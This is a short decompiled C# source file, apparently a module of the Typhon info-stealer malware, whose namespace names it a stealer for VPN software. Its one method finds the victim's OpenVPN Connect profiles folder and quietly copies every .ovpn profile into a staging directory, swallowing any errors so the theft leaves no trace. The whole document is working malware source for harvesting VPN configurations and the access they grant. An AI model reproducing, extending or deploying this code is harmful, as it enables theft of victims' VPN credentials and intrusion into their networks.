using System;
using System.IO;

namespace Typhon.Stealer.Software.VPN
{
	// Token: 0x0200000F RID: 15
	internal class Class2
	{
		// Token: 0x06000051 RID: 81 RVA: 0x000043E8 File Offset: 0x000025E8
		public static void Save(string sSavePath)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath + "\\Profiles");
				foreach (string text in Directory.GetFiles(path))
				{
					if (Path.GetExtension(text).Contains("ovpn"))
					{
						File.Copy(text, Path.Combine(sSavePath, "profiles\\" + Path.GetFileName(text)));
					}
				}
			}
			catch
			{
			}
		}
	}
}
